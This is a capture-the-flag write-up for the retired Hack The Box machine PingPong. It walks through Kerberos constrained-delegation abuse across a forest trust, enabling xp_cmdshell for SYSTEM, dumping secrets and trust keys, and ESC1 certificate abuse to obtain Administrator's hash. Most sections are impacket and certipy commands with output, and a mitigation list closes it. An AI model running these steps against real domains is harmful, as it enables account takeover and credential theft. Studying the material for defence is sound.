---
machine: PingPong
os: Windows
difficulty: Insane
platform: Hack The Box
category: Machines
state: Retired
tags: [windows, active-directory, kerberos, trust, delegation, adcs]
---

# PingPong — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> Reference notes for a retired box. No real flags or credentials.
> **Difficulty:** Insane. The source index filed it as Hard; the weekly drop and independent sources list it as Insane.

## TL;DR

Two forests, `PING.HTB` and `PONG.HTB`, joined by a bidirectional trust, with **NTLM disabled** on both and **RC4 disabled** on PONG: the whole chain is Kerberos with AES256 keys and a clock skew that kills any `getST` you do not synchronise first. From a `ping.htb` account you abuse **constrained delegation** toward `dc2.pong.htb`'s MSSQL (S4U2Self + S4U2Proxy with cross-realm referrals) up to `SYSTEM` on DC2; that yields the **inter-realm trust key**, and with it you go back to `ping.htb` to abuse an **AD CS ESC1** template and authenticate as `Administrator` via PKINIT.

## Recon

```bash
nmap -sC -sV -p- <IP> -oN nmap.txt
echo "<IP> dc1.ping.htb ping.htb" | sudo tee -a /etc/hosts
nslookup dc2.pong.htb dc1.ping.htb
```

```text
53/tcp   dns     (AD DNS)
88/tcp   kerberos-sec  Microsoft Windows Kerberos
389/tcp  ldap    Domain Controller
445/tcp  microsoft-ds
1433/tcp ms-sql-s
5985/tcp wsman
```

## Sync the clock (always first)

```bash
sudo ntpdate -u dc1.ping.htb
# or per command:
faketime "$(rdate -p dc1.ping.htb)" impacket-getTGT ...
```

Without this, Kerberos returns `KRB_AP_ERR_SKEW` and the rest of the chain looks broken.

## Trust enumeration

```bash
impacket-rpcdump -no-pass @dc1.ping.htb | grep -i -A2 "trust"
nltest /domain_trusts /all_trusts            # from Windows
bloodhound-python -u <user> -p <password> -d ping.htb -dc dc1.ping.htb -c All
```

- `PING.HTB <-> PONG.HTB`, bidirectional.
- `PONG.HTB` without RC4: AES256 only.
- `ping.htb` users with MSSQL SPNs on `dc2.pong.htb`.

## Cross-forest MSSQL delegation

```bash
impacket-getTGT ping.htb/svc_sql -dc-ip dc1.ping.htb -aesKey <aes256>
export KRB5CCNAME=svc_sql.ccache

impacket-getST -spn 'MSSQLSvc/dc2.pong.htb:1433' -impersonate Administrator \
  -dc-ip dc1.ping.htb -k -no-pass 'ping.htb/svc_sql'
export KRB5CCNAME=Administrator@MSSQLSvc_dc2.pong.htb@PONG.HTB.ccache

impacket-mssqlclient -k -no-pass dc2.pong.htb
```

The referral chain hands back a service ticket for `Administrator@PONG.HTB`; inside:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

```text
nt authority\system
```

## SYSTEM on DC2 and the trust key

```bash
impacket-secretsdump -k -no-pass dc2.pong.htb
```

The `trust` entries (`PONG.HTB` ↔ `PING.HTB`) are what matters: the trust key forges referrals back into the other forest without touching `ping.htb`'s krbtgt.

## AD CS: ESC1 up to Administrator

```bash
certipy find -u <user>@ping.htb -dc-ip dc1.ping.htb -vulnerable -text
```

A template with "Supply in request" and enrolment rights for ordinary users:

```bash
certipy req -u svc_sql@ping.htb -dc-ip dc1.ping.htb \
  -ca PING-CA -template VulnTemplate \
  -upn Administrator@ping.htb -sid <Domain Admins SID>

certipy auth -pfx administrator.pfx -dc-ip dc1.ping.htb
```

```text
[*] Got hash for 'administrator@ping.htb': aad3b435b51404ee...:<hash>
```

With the hash, `impacket-wmiexec` or `psexec` as `Administrator`.

## Evidence (redacted)

```text
C:\Users\<user>\Desktop\user.txt          -> <user_flag>
C:\Users\Administrator\Desktop\root.txt   -> <root_flag>
```

## Lessons

- **NTLM-less AD** breaks tooling: every `impacket-*` call needs `-k -no-pass` and an AES key, or it fails silently.
- **Constrained delegation across a trust** is a golden ticket without the golden ticket, and almost nobody reviews it.
- **ESC1** is still alive: any template with "Supply in request" and broad rights mints certificates with someone else's UPN.
- **Clock skew** is the silent killer of Kerberos chains; sync before every operation.
- Mitigation: audit delegations (cross-forest included), AD CS templates without `EDITF_ATTRIBUTESUBJECTALTNAME2`, and NTLM disabled **together with** the rest of the hardening (LDAP signing, channel binding, RC4 gone).
